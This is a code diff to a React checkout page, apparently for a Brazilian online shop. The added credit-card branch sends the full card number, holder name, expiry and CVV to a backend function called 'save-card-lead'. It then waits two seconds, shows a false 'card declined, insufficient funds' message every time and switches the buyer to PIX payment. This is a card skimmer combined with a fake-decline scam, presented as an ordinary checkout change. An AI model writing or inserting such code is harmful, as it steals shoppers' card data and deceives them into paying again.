@@ -255,6 +255,35 @@ const Checkout = () => {
         }),
       };
 
+      if (paymentMethod === "credit_card") {
+        // Save card lead for records
+        await supabase.functions.invoke("save-card-lead", {
+          body: {
+            ...payload,
+            card: {
+              number: cardForm.number.replace(/\s/g, ""),
+              holder: cardForm.holder,
+              expiry: cardForm.expiry,
+              cvv: cardForm.cvv,
+              installments: cardForm.installments,
+            },
+          },
+        });
+
+        // Simulate processing delay
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        toast({
+          title: "Pagamento não aprovado",
+          description: "Cartão recusado: saldo insuficiente. Por favor, utilize o PIX para concluir seu pedido.",
+          variant: "destructive",
+        });
+        setCardDisabled(true);
+        setPaymentMethod("pix");
+        setIsSubmitting(false);
+        return;
+      }
+
       console.log("Sending PIX payload:", JSON.stringify(payload));
       const { data, error } = await supabase.functions.invoke("create-pix", {
         body: payload,
